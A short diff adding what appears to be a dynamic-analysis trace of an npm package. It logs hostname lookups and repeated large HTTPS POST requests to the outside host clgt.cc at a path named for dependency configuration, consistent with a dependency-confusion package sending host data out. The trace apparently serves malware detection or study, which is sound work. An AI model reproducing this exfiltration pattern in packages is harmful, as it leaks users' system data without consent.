@@ -1,0 +1,5 @@
+[os.hostname] []
+[https.request] [{"hostname":"clgt.cc","port":443,"path":"/dependency-conf-npm.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":25393}},null]
+[fs.writeFileSync] ["dynamic_log.txt","Triggered dynamic API"]
+[os.hostname] []
+[https.request] [{"hostname":"clgt.cc","port":443,"path":"/dependency-conf-npm.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Content-Length":25376}},null]
